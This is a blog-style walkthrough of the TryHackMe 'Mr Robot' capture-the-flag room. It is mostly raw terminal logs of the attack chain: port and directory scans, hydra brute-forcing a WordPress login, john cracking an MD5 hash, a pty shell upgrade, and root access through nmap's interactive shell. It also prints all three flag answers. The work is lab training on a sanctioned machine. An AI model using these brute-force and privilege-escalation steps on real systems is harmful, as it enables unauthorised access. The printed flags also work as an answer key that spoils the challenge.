---
title: "THM Mr Robot"
date: 2023-05-09T12:41:18-07:00
draft: false
---

# THM - Mr. Robot

Task 1 Connect to our network

To deploy the Mr. Robot virtual machine, you will first need to connect to our network.  

Answer the questions below

Connect to our network using OpenVPN. Here is a mini walkthrough of connecting:

Go to your [access](http://tryhackme.com/access) page and download your configuration file.

![](https://i.gyazo.com/c86eba5538466dc1d948e09b6f14b53b.png)

Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.

![](https://i.gyazo.com/42083cc1831acad79e5a6fa2b235792f.png)(change "ben.ovpn" to your config file)

When you run this you see lots of text, at the end it will say Initialization Sequence Completed

You can verify you are connected by looking on your access page. Refresh the page

You should see a green tick next to Connected. It will also show you your internal IP address.

![](https://i.gyazo.com/fad648871fd0e51d1d5590d005329f1c.png)

You are now ready to use our machines on our network!

Now when you deploy material, you will see an internal IP address of your Virtual Machine.

Task 2 Hack the machine

![](https://i.imgur.com/mp5JwKO.png)  

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. **This machine is used here with the explicit permission of the creator <3** 

Answer the questions below

What is key 1? A: 

What is key 2? A: 

What is key 3? A: 

Created by ![](https://tryhackme-images.s3.amazonaws.com/user-avatars/ben.gif) [ben](https://tryhackme.com/p/ben)

This is a **free** room, which means anyone can deploy virtual machines in the room (without being subscribed)! 64685 users are in here and this room is 1345 days old.

**Note**:
[jmk@arch OffensivePentesting]$ nmap -sCV 10.10.59.193
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 17:25 PDT
Nmap scan report for 10.10.59.193
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds

### [jmk@arch OffensivePentesting]$ gobuster dir -u http://10.10.59.193 -w /usr/share/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
### by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.59.193
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
### 2022/08/03 17:27:48 Starting gobuster in directory enumeration mode
===============================================================

/images               (Status: 301) [Size: 235] [--> http://10.10.59.193/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.59.193/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.59.193/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.59.193/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.59.193/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.59.193/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.59.193/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.59.193/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.59.193/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.59.193/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.59.193/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.59.193/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2606]
/css                  (Status: 301) [Size: 232] [--> http://10.10.59.193/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.59.193/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.59.193/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.59.193/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.59.193/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.59.193/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.59.193/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]

10.10.59.193
root@fsociety:~#
commands: 
	prepare
	fsociety
	inform
	question
	wakeup
	join

http://10.10.59.193/robots
User-agent: *
fsocity.dic  - file with usernames and passwords 
key-1-of-3.txt  -- 073403c8a58a1f80d943455fb30724b9

readme 
I like where you head is at. However I'm not going to help you.

http://10.10.59.193/license
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

[jmk@arch THM]$ hydra -L fsocity.dic -p test 10.10.59.193 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-03 18:16:04
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.59.193:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.59.193   login: Elliot   password: test
[STATUS] 1854.00 tries/min, 1854 tries in 00:01h, 856381 to do in 07:42h, 30 active
[80][http-post-form] host: 10.10.59.193   login: elliot   password: test


[jmk@arch THM]$ hydra -l Elliot -P fsocity.dic 10.10.59.193 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-03 18:23:26
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:1/p:858235), ~28608 tries per task
[DATA] attacking http-post-form://10.10.59.193:80/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username
[STATUS] 1670.00 tries/min, 1670 tries in 00:01h, 856565 to do in 08:33h, 30 active
[STATUS] 907.33 tries/min, 2722 tries in 00:03h, 855513 to do in 15:43h, 30 active
[STATUS] 489.43 tries/min, 3426 tries in 00:07h, 854809 to do in 29:07h, 30 active
[STATUS] 320.73 tries/min, 4811 tries in 00:15h, 853424 to do in 44:21h, 30 active


line 858151  ER28-0652
ER28-0652

[jmk@arch MrRobot]$ john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-08-03 19:29) 0g/s 21452Kp/s 21452Kc/s 21452KC/s 2Fwiki..ABCDEFGHIJKLMNOPQRSTUVWXYZ
$ ls
key-2-of-3.txt
password.raw-md5
$ ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$ su robot
su: must be run from a terminal
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot

daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ whoami
whoami
robot

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959

robot@linux:/$ find / -perm +600 2>/dev/null | grep '/bin/'
find / -perm +600 2>/dev/null | grep '/bin/'
/bin/bzcmp
/bin/rbash
/bin/sed
/bin/mktemp
/bin/lesskey
/bin/mknod
/bin/ypdomainname
/bin/date
/bin/less
/bin/mountpoint
/bin/rnano
/bin/zdiff
/bin/ss
/bin/fuser
/bin/which
...


robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
